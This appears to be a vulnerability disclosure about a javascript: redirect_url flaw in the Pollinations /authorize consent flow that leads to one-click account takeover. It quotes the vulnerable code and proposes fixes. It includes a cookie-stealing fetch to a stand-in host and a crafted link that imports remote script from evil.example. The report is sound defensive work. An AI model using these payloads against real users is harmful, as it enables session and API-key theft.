# One-click account takeover: enter's `/authorize` legacy flow accepts a `javascript:` `redirect_url` — the consent screen's Allow/Decline/Cancel buttons assign it to `window.location.href`, executing attacker JS in the `enter.pollinations.ai` origin (no sign-in even needed for Cancel/Deny)

## Summary

The legacy `/authorize` flow (no `client_id`/`app_key`, fragment `#api_key=` delivery) validates the user-supplied `redirect_url` with nothing but a URL parse:

```tsx
// frontend/src/components/auth/authorize.tsx:55-61
function safeParseUrl(url: string): URL | null {
    try {
        return new URL(url);          // ← no protocol check
    } catch {
        return null;
    }
}
```

(`frontend/src/routes/authorize.tsx` `validateSearch` passes `redirect_url`/`redirect_uri` through as an unchecked string.) The codebase already knows this class needs a scheme gate — `parseAppUrl` in `frontend/src/lib/return-to-app.tsx:5-14` enforces http/https for every other redirect param (top-up, edit-key, grant) — but the authorize path skipped it.

When no `client_id`/`app_key` is present, validation short-circuits entirely:

```tsx
// authorize.tsx:243-247
if (!app_key) {
    setRedirectValidationState("valid");   // ← zero redirect validation
    return;
}
```

so `canAuthorize` and `canRedirectOnDeny` are both `true` for any parseable URL. The sinks then navigate to it on every outcome:

```tsx
// authorize.tsx:429-434 (Allow)
url.hash = hash.toString();
window.location.href = url.toString();

// authorize.tsx:454-465 (Deny) — same assignment with error=access_denied
```

and the signed-out `SignInScreen`'s Cancel button calls the same `handleDeny` — **no authentication required for that path**.

A `javascript:` URL survives the hash/searchParams mutation intact (WHATWG semantics, verified):

```
new URL("javascript:fetch('https://evil/'+document.cookie)")
  .hash = "api_key=..." → "javascript:fetch('https://evil/'+document.cookie)#api_key=..."
```

and `window.location.href = "javascript:…"` executes the payload in the **enter.pollinations.ai origin**. There is no CSP anywhere in the SPA (`frontend/index.html`, `src/index.ts` — none) to stop it. The consent card shows the hostname as `""` ("Unknown app"), so nothing looks off to the victim.

## Attack (end-to-end)

1. Attacker sends: `https://enter.pollinations.ai/authorize?redirect_url=javascript%3Aimport(%22https%3A%2F%2Fevil.example%2Fs.js%22)`
2. Victim opens it; the standard Pollinations consent screen renders.
3. Victim clicks **Cancel** (signed-out screen — no login needed), **Decline**, or **Allow** (after sign-in; the GitHub callback returns to the same URL).
4. The injected script runs in the dashboard origin with the victim's session:
   - `POST /api/session-token` → `POST /api/account/keys` — mint a fresh `sk_` and exfiltrate it,
   - read balances/usage, create publishable keys, approve device flows.
   Full account-API takeover from one click on a plausible link.

The repo itself guards this exact scheme class on the *registered-redirectUris* path — `src/api.ts:11` and `test/integration/api-keys.test.ts:250` (test uses `javascript://x/%0afetch(...)`) — but the legacy no-client path has no gate.

## Fix

1. In `safeParseUrl` (and `validateSearch` in `routes/authorize.tsx`), reject anything whose protocol isn't `http:`/`https:` — copy `parseAppUrl`'s check. One line + a test with `javascript:`/`data:` URLs asserting both Allow and Deny refuse to navigate.
2. Defense-in-depth: reject non-http(s) `consent.redirectOrigin`/`redirectUri` in `shared/auth/api-key-creation.ts:114-133` (the Allow path stores it), and add a CSP to the SPA.
3. Consider whether the legacy fragment flow (no client registration) should exist at all now that the OAuth 2.1 code flow is live — requiring a registered client for `#api_key=` delivery removes this entire surface.
